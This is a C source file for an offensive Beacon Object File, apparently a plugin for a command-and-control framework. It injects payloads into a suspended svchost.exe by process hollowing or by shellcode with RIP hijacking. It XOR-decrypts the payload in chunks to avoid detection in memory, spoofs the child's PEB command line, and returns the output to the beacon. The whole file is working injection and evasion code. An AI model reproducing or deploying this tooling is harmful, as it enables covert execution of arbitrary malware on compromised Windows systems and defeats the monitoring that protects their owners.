#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <tlhelp32.h>

#include "hollow_defs.h"
#include "../No-Consolation/include/beacon.h"

#define MODE_PE        0
#define MODE_SHELLCODE 1

#define SRC_BYTES      0
#define SRC_LOCAL_PATH 1

#define OUTPUT_YES     0
#define OUTPUT_NO      1

#define DEFAULT_TIMEOUT_MS 60000
#define POLL_INTERVAL_MS   100
#define OUTPUT_CHUNK_MAX   (1024 * 64)

#define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"

static void *xmemset(void *d, int c, size_t n) {
    unsigned char *p = (unsigned char *)d;
    while (n--) *p++ = (unsigned char)c;
    return d;
}

static void *xmemcpy(void *d, const void *s, size_t n) {
    unsigned char *dp = (unsigned char *)d;
    const unsigned char *sp = (const unsigned char *)s;
    while (n--) *dp++ = *sp++;
    return d;
}

/* XOR decrypt a buffer in place */
static void XorDecrypt(BYTE *buf, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) buf[i] ^= key;
}

/* ---- Output capture ---- */

static void DrainPipe(HANDLE hPipe) {
    for (;;) {
        DWORD avail = 0;
        if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0)
            return;
        DWORD toRead = (avail < OUTPUT_CHUNK_MAX) ? avail : OUTPUT_CHUNK_MAX;
        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, toRead + 1);
        if (!buf) return;
        DWORD br = 0;
        if (KERNEL32$ReadFile(hPipe, buf, toRead, &br, NULL) && br > 0) {
            buf[br] = 0;
            BeaconOutput(CALLBACK_OUTPUT, (char*)buf, br);
        }
        KERNEL32$LocalFree(buf);
        if (br < toRead) return;
    }
}

static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
    DWORD elapsed = 0;
    DWORD exitCode = 259;
    while (elapsed < timeoutMs) {
        DrainPipe(hPipe);
        KERNEL32$GetExitCodeProcess(hProcess, &exitCode);
        if (exitCode != 259) break;
        KERNEL32$Sleep(POLL_INTERVAL_MS);
        elapsed += POLL_INTERVAL_MS;
    }
    DrainPipe(hPipe);
    if (exitCode == 259) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout %lus, killing child", timeoutMs / 1000);
        KERNEL32$TerminateProcess(hProcess, 1);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Child exit code: %lu", exitCode);
    }
}

/* ---- Read file on target ---- */

static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
    *outSize = 0;
    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
        NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot open %s: %lu", path, KERNEL32$GetLastError());
        return NULL;
    }
    DWORD sz = KERNEL32$GetFileSize(hFile, NULL);
    if (sz == 0 || sz == INVALID_FILE_SIZE) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }
    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, sz);
    if (!buf) { KERNEL32$CloseHandle(hFile); return NULL; }
    DWORD br = 0;
    if (!KERNEL32$ReadFile(hFile, buf, sz, &br, NULL) || br != sz) {
        KERNEL32$LocalFree(buf);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }
    KERNEL32$CloseHandle(hFile);
    *outSize = sz;
    return buf;
}

/* Write PE to child process, decrypting from XOR-encoded source.
   Decrypts into a small page-sized buffer, writes, then zeros the buffer.
   The full plaintext PE never exists in beacon memory at once. */
static BOOL WritePEToChild(HANDLE hProcess, BYTE *pRemote,
                           BYTE *encPayload, DWORD payloadSize,
                           PIMAGE_NT_HEADERS pNt, BYTE xorKey) {

    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    SIZE_T bw = 0;

    if (xorKey == 0) {
        /* No encryption — write directly (local file path) */
        KERNEL32$WriteProcessMemory(hProcess, pRemote, encPayload,
            pNt->OptionalHeader.SizeOfHeaders, &bw);
        for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (pSec[i].SizeOfRawData == 0) continue;
            KERNEL32$WriteProcessMemory(hProcess,
                pRemote + pSec[i].VirtualAddress,
                encPayload + pSec[i].PointerToRawData,
                pSec[i].SizeOfRawData, &bw);
        }
        return TRUE;
    }

    /* Encrypted: decrypt + write in chunks, never hold full plaintext.
       Use a 4KB temp buffer — decrypt chunk, write, zero. */
    #define CHUNK 4096
    BYTE *tmp = (BYTE*)KERNEL32$LocalAlloc(0x40, CHUNK);
    if (!tmp) return FALSE;

    /* Write headers */
    DWORD hdrSize = pNt->OptionalHeader.SizeOfHeaders;
    DWORD off = 0;
    while (off < hdrSize) {
        DWORD n = (hdrSize - off < CHUNK) ? (hdrSize - off) : CHUNK;
        xmemcpy(tmp, encPayload + off, n);
        XorDecrypt(tmp, n, xorKey);
        KERNEL32$WriteProcessMemory(hProcess, pRemote + off, tmp, n, &bw);
        xmemset(tmp, 0, n);
        off += n;
    }

    /* Write sections */
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        DWORD secOff = 0;
        DWORD rawOff = pSec[i].PointerToRawData;
        DWORD rawSz  = pSec[i].SizeOfRawData;
        while (secOff < rawSz) {
            DWORD n = (rawSz - secOff < CHUNK) ? (rawSz - secOff) : CHUNK;
            xmemcpy(tmp, encPayload + rawOff + secOff, n);
            XorDecrypt(tmp, n, xorKey);
            KERNEL32$WriteProcessMemory(hProcess,
                pRemote + pSec[i].VirtualAddress + secOff, tmp, n, &bw);
            xmemset(tmp, 0, n);
            secOff += n;
        }
    }

    KERNEL32$LocalFree(tmp);
    return TRUE;
}

/* ================================================================
 *  BOF entry
 *
 *  Args from .axs (bof_pack):
 *    int  mode       0=PE, 1=shellcode
 *    int  source     0=bytes, 1=local path
 *    int  noOutput   0=capture, 1=no
 *    int  timeout_ms
 *    int  xorKey     0=none, 1-255=XOR key for payload bytes
 *    int  (unused)
 *    cstr spawnto
 *    cstr args
 *    cstr localPath
 *    bytes payload   (XOR encrypted if xorKey != 0)
 * ================================================================ */

void go(char *rawArgs, int rawLen) {
    datap parser;
    BeaconDataParse(&parser, rawArgs, rawLen);

    int mode       = BeaconDataInt(&parser);
    int source     = BeaconDataInt(&parser);
    int noOutput   = BeaconDataInt(&parser);
    int timeoutMs  = BeaconDataInt(&parser);
    int xorKey     = BeaconDataInt(&parser);
    int unused     = BeaconDataInt(&parser);

    int spawntoLen = 0;
    char *spawnto  = BeaconDataExtract(&parser, &spawntoLen);
    int argsLen = 0;
    char *args     = BeaconDataExtract(&parser, &argsLen);
    int localPathLen = 0;
    char *localPath  = BeaconDataExtract(&parser, &localPathLen);
    int peDataLen = 0;
    char *peData     = BeaconDataExtract(&parser, &peDataLen);

    const char *spawntoA = DEFAULT_SPAWNTO_A;
    if (spawnto && spawnto[0]) spawntoA = spawnto;
    if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
    BOOL wantOutput = (noOutput != OUTPUT_NO);
    BYTE xkey = (BYTE)(xorKey & 0xFF);

    /* ---- Get payload ---- */
    BYTE *payload = NULL;
    DWORD payloadSize = 0;
    BOOL freePayload = FALSE;

    if (source == SRC_LOCAL_PATH) {
        if (!localPath || !localPath[0]) {
            BeaconPrintf(CALLBACK_ERROR, "No local path");
            return;
        }
        payload = ReadLocalFile(localPath, &payloadSize);
        if (!payload) return;
        freePayload = TRUE;
        xkey = 0; /* local files are not encrypted */
    } else {
        if (!peData || peDataLen <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "No payload bytes");
            return;
        }
        payload = (BYTE*)peData;
        payloadSize = (DWORD)peDataLen;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s | %lu bytes | output=%s | xor=0x%02x",
        mode == MODE_PE ? "PE" : "Shellcode",
        payloadSize, wantOutput ? "yes" : "no", xkey);

    /* ---- For PE validation, we need to peek at the decrypted headers ---- */
    BYTE hdrBuf[4096];
    DWORD hdrPeek = (payloadSize < sizeof(hdrBuf)) ? payloadSize : sizeof(hdrBuf);
    xmemcpy(hdrBuf, payload, hdrPeek);
    if (xkey) XorDecrypt(hdrBuf, hdrPeek, xkey);

    if (mode == MODE_PE) {
        if (hdrPeek < sizeof(IMAGE_DOS_HEADER)) {
            BeaconPrintf(CALLBACK_ERROR, "Too small");
            goto cleanup;
        }
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdrBuf;
        if (pDos->e_magic != IMAGE_DOS_SIGNATURE) {
            BeaconPrintf(CALLBACK_ERROR, "Bad MZ (0x%x) — wrong XOR key?", pDos->e_magic);
            goto cleanup;
        }
        if ((DWORD)pDos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > hdrPeek) {
            BeaconPrintf(CALLBACK_ERROR, "e_lfanew out of header peek range");
            goto cleanup;
        }
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(hdrBuf + pDos->e_lfanew);
        if (pNt->Signature != IMAGE_NT_SIGNATURE) {
            BeaconPrintf(CALLBACK_ERROR, "Bad PE sig");
            goto cleanup;
        }
        if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
            BeaconPrintf(CALLBACK_ERROR, "Not x64");
            goto cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PE OK: entry=0x%lx image=0x%lx sections=%d",
            pNt->OptionalHeader.AddressOfEntryPoint,
            pNt->OptionalHeader.SizeOfImage,
            pNt->FileHeader.NumberOfSections);
    }
    /* Zero the header peek buffer immediately */
    xmemset(hdrBuf, 0, sizeof(hdrBuf));

    /* ---- Create process suspended ---- */
    SECURITY_ATTRIBUTES sa;
    xmemset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hPipeRead = NULL, hPipeWrite = NULL;
    STARTUPINFOA si;
    xmemset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (wantOutput) {
        HANDLE hInR = NULL, hInW = NULL;
        if (!KERNEL32$CreatePipe(&hPipeRead, &hPipeWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe: %lu", KERNEL32$GetLastError());
            goto cleanup;
        }
        KERNEL32$CreatePipe(&hInR, &hInW, &sa, 0);
        KERNEL32$SetHandleInformation(hPipeRead, 1, 0);
        if (hInW) KERNEL32$SetHandleInformation(hInW, 1, 0);

        si.dwFlags |= STARTF_USESTDHANDLES;
        si.hStdInput  = hInR;
        si.hStdOutput = hPipeWrite;
        si.hStdError  = hPipeWrite;
    }

    char cmdLine[512];
    xmemset(cmdLine, 0, sizeof(cmdLine));
    MSVCRT$_snprintf(cmdLine, sizeof(cmdLine) - 1, "%s", spawntoA);

    PROCESS_INFORMATION pi;
    xmemset(&pi, 0, sizeof(pi));

    if (!KERNEL32$CreateProcessA(NULL, cmdLine, NULL, NULL,
            wantOutput ? TRUE : FALSE,
            CREATE_SUSPENDED | CREATE_NO_WINDOW,
            NULL, NULL, &si, &pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess: %lu", KERNEL32$GetLastError());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PID %lu suspended", pi.dwProcessId);

    if (hPipeWrite) { KERNEL32$CloseHandle(hPipeWrite); hPipeWrite = NULL; }

    if (mode == MODE_SHELLCODE) {
        /* ---- SHELLCODE: alloc + write + hijack RIP ---- */
        LPVOID pSc = KERNEL32$VirtualAllocEx(pi.hProcess, NULL, payloadSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pSc) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
            KERNEL32$TerminateProcess(pi.hProcess, 1);
            goto proc_cleanup;
        }

        /* Decrypt + write shellcode in chunks */
        SIZE_T bw = 0;
        if (xkey) {
            BYTE tmp[4096];
            DWORD off = 0;
            while (off < payloadSize) {
                DWORD n = (payloadSize - off < sizeof(tmp)) ? (payloadSize - off) : sizeof(tmp);
                xmemcpy(tmp, payload + off, n);
                XorDecrypt(tmp, n, xkey);
                KERNEL32$WriteProcessMemory(pi.hProcess, (BYTE*)pSc + off, tmp, n, &bw);
                xmemset(tmp, 0, n);
                off += n;
            }
        } else {
            KERNEL32$WriteProcessMemory(pi.hProcess, pSc, payload, payloadSize, &bw);
        }

        CONTEXT ctx;
        xmemset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_ALL;
        KERNEL32$GetThreadContext(pi.hThread, &ctx);
        ctx.Rip = (DWORD64)pSc;
        KERNEL32$SetThreadContext(pi.hThread, &ctx);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode at 0x%p, RIP set", pSc);

    } else {
        /* ---- PE HOLLOWING ---- */

        /* We need PE headers to drive the hollowing.
           Decrypt a LOCAL COPY of just the headers, use it, then zero it. */
        DWORD hdrMax = 4096;
        BYTE *hdr = (BYTE*)KERNEL32$LocalAlloc(0x40, hdrMax);
        if (!hdr) {
            KERNEL32$TerminateProcess(pi.hProcess, 1);
            goto proc_cleanup;
        }
        DWORD hdrCopy = (payloadSize < hdrMax) ? payloadSize : hdrMax;
        xmemcpy(hdr, payload, hdrCopy);
        if (xkey) XorDecrypt(hdr, hdrCopy, xkey);

        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hdr;
        PIMAGE_NT_HEADERS pNt  = (PIMAGE_NT_HEADERS)(hdr + pDos->e_lfanew);

        /* Get thread context → PEB → original ImageBase */
        CONTEXT ctx;
        xmemset(&ctx, 0, sizeof(ctx));
        ctx.ContextFlags = CONTEXT_ALL;
        if (!KERNEL32$GetThreadContext(pi.hThread, &ctx)) {
            BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
            xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
            KERNEL32$TerminateProcess(pi.hProcess, 1);
            goto proc_cleanup;
        }

        ULONG_PTR pebAddr = ctx.Rdx;
        ULONG_PTR origBase = 0;
        SIZE_T br = 0;
        KERNEL32$ReadProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10),
            &origBase, sizeof(origBase), &br);

        BeaconPrintf(CALLBACK_OUTPUT, "[*] origBase=0x%p peBase=0x%p",
            (void*)origBase, (void*)(ULONG_PTR)pNt->OptionalHeader.ImageBase);

        /* Unmap original image */
        NTDLL$NtUnmapViewOfSection(pi.hProcess, (PVOID)origBase);

        /* Allocate at origBase (loader's LDR entry points here) */
        BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess,
            (PVOID)origBase, pNt->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!pRemote) {
            pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess,
                (PVOID)pNt->OptionalHeader.ImageBase, pNt->OptionalHeader.SizeOfImage,
                MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        }
        if (!pRemote) {
            pRemote = (BYTE*)KERNEL32$VirtualAllocEx(pi.hProcess, NULL,
                pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE);
        }
        if (!pRemote) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
            xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
            KERNEL32$TerminateProcess(pi.hProcess, 1);
            goto proc_cleanup;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Alloc 0x%p (0x%lx bytes)",
            pRemote, pNt->OptionalHeader.SizeOfImage);

        /* Write PE to child (decrypting in chunks, plaintext never in beacon) */
        WritePEToChild(pi.hProcess, pRemote, payload, payloadSize, pNt, xkey);
        BeaconPrintf(CALLBACK_OUTPUT, "[+] PE written to child");

        /* Relocate if needed */
        ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
        if (delta != 0) {
            IMAGE_DATA_DIRECTORY relDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            if (relDir.Size > 0 && relDir.VirtualAddress > 0) {
                /* Read the .reloc section from child, apply, write back */
                BYTE *relocData = (BYTE*)KERNEL32$LocalAlloc(0x40, relDir.Size);
                if (relocData) {
                    SIZE_T rr = 0;
                    KERNEL32$ReadProcessMemory(pi.hProcess,
                        pRemote + relDir.VirtualAddress, relocData, relDir.Size, &rr);

                    /* Apply relocations by reading/patching/writing pages in child */
                    BYTE *pBlock = relocData;
                    DWORD processed = 0;
                    int count = 0;
                    while (processed < relDir.Size) {
                        DWORD pageRva   = *(DWORD*)(pBlock);
                        DWORD blockSize = *(DWORD*)(pBlock + 4);
                        if (blockSize == 0 || blockSize < 8) break;
                        DWORD entries = (blockSize - 8) / 2;
                        WORD *entry = (WORD*)(pBlock + 8);

                        /* Read the page from child */
                        BYTE pageBuf[4096];
                        DWORD pageSize = 4096;
                        if (pageRva + pageSize > pNt->OptionalHeader.SizeOfImage)
                            pageSize = pNt->OptionalHeader.SizeOfImage - pageRva;
                        SIZE_T pbr = 0;
                        KERNEL32$ReadProcessMemory(pi.hProcess, pRemote + pageRva,
                            pageBuf, pageSize, &pbr);

                        BOOL modified = FALSE;
                        for (DWORD j = 0; j < entries; j++) {
                            BYTE type = (BYTE)(entry[j] >> 12);
                            WORD off  = entry[j] & 0xFFF;
                            if (type == 10 && off + 8 <= pageSize) {
                                ULONG_PTR *p = (ULONG_PTR*)(pageBuf + off);
                                *p += delta;
                                count++;
                                modified = TRUE;
                            } else if (type == 3 && off + 4 <= pageSize) {
                                DWORD *p = (DWORD*)(pageBuf + off);
                                *p += (DWORD)delta;
                                count++;
                                modified = TRUE;
                            }
                        }

                        if (modified) {
                            SIZE_T bw = 0;
                            KERNEL32$WriteProcessMemory(pi.hProcess, pRemote + pageRva,
                                pageBuf, pageSize, &bw);
                        }

                        pBlock += blockSize;
                        processed += blockSize;
                    }
                    KERNEL32$LocalFree(relocData);

                    /* Update ImageBase in child's PE header */
                    ULONG_PTR newImgBase = (ULONG_PTR)pRemote;
                    SIZE_T bw2 = 0;
                    DWORD imgBaseOff = pDos->e_lfanew +
                        offsetof(IMAGE_NT_HEADERS, OptionalHeader) +
                        offsetof(IMAGE_OPTIONAL_HEADER, ImageBase);
                    KERNEL32$WriteProcessMemory(pi.hProcess, pRemote + imgBaseOff,
                        &newImgBase, sizeof(newImgBase), &bw2);

                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %d relocations (delta=0x%llx)",
                        count, (unsigned long long)delta);
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "Relocs needed but PE has none");
                xmemset(hdr, 0, hdrMax); KERNEL32$LocalFree(hdr);
                KERNEL32$TerminateProcess(pi.hProcess, 1);
                goto proc_cleanup;
            }
        } else {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] No relocs needed");
        }

        /* Update PEB ImageBase */
        ULONG_PTR newBase = (ULONG_PTR)pRemote;
        SIZE_T bw3 = 0;
        KERNEL32$WriteProcessMemory(pi.hProcess, (PVOID)(pebAddr + 0x10),
            &newBase, sizeof(newBase), &bw3);

        /* Set entry point */
        ctx.Rcx = (DWORD64)((ULONG_PTR)pRemote + pNt->OptionalHeader.AddressOfEntryPoint);
        KERNEL32$SetThreadContext(pi.hThread, &ctx);

        BeaconPrintf(CALLBACK_OUTPUT, "[+] Entry RCX=0x%p", (void*)(ULONG_PTR)ctx.Rcx);

        /* Zero and free header copy */
        xmemset(hdr, 0, hdrMax);
        KERNEL32$LocalFree(hdr);
    }

    /* ---- Spoof command line in PEB so the PE sees its real args ---- */
    if (mode == MODE_PE && args && args[0]) {
        PROCESS_BASIC_INFORMATION pbi;
        xmemset(&pbi, 0, sizeof(pbi));
        if (NTDLL$NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), NULL) == 0) {
            PEB peb;
            SIZE_T pbr = 0;
            if (KERNEL32$ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &pbr)) {
                RTL_USER_PROCESS_PARAMETERS params;
                if (KERNEL32$ReadProcessMemory(pi.hProcess, peb.ProcessParameters, &params, sizeof(params), &pbr)) {
                    /* Build: "basename args" */
                    const char *bn = spawntoA;
                    const char *s = spawntoA;
                    while (*s) { if (*s == '\\' || *s == '/') bn = s + 1; s++; }

                    char realCmd[4096];
                    xmemset(realCmd, 0, sizeof(realCmd));
                    MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", bn, args);

                    int wLen = KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, NULL, 0);
                    if (wLen > 0) {
                        LPWSTR wBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wLen * sizeof(WCHAR));
                        if (wBuf) {
                            KERNEL32$MultiByteToWideChar(0, 0, realCmd, -1, wBuf, wLen);
                            SIZE_T bw = 0;
                            KERNEL32$WriteProcessMemory(pi.hProcess,
                                params.CommandLine.Buffer, wBuf,
                                wLen * sizeof(WCHAR), &bw);
                            USHORT newLen = (USHORT)((wLen - 1) * sizeof(WCHAR));
                            KERNEL32$WriteProcessMemory(pi.hProcess,
                                (PBYTE)peb.ProcessParameters +
                                    offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
                                &newLen, sizeof(USHORT), &bw);
                            KERNEL32$LocalFree(wBuf);
                            BeaconPrintf(CALLBACK_OUTPUT, "[+] CmdLine: %s", realCmd);
                        }
                    }
                }
            }
        }
    }

    /* ---- Resume ---- */
    KERNEL32$ResumeThread(pi.hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Resumed");

    if (wantOutput && hPipeRead) {
        CollectOutput(pi.hProcess, hPipeRead, (DWORD)timeoutMs);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Fire and forget");
    }

proc_cleanup:
    if (hPipeRead)    KERNEL32$CloseHandle(hPipeRead);
    if (pi.hProcess)  KERNEL32$CloseHandle(pi.hProcess);
    if (pi.hThread)   KERNEL32$CloseHandle(pi.hThread);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");

cleanup:
    if (freePayload && payload) KERNEL32$LocalFree(payload);
}
